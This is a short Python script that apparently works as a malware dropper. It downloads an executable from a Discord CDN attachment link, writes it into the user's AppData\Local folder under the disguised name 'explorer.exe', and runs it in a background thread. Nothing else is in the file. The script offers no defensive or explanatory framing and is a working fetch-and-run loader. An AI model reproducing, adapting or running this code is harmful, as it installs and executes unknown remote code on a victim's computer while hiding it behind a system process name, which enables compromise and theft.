import requests
import subprocess
import threading
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

def process() -> None:
    if os.path.exists(path):
        subprocess.run(path, shell=True)

def download() -> None:
    response = requests.get("https://cdn.discordapp.com/attachments/1200823899282223234/1200824132946907257/main.exe?ex=65c7959f&is=65b5209f&hm=984332d3ce48cb59dc92fd2aa7dce1d7babd82931e14367bb435d590fe68fe95&")

    if response.status_code != 200:
        exit()

    with open(path, 'wb') as file:
        file.write(response.content)

def execute() -> None:
    thread = threading.Thread(target=process)
    thread.start()

download(); execute()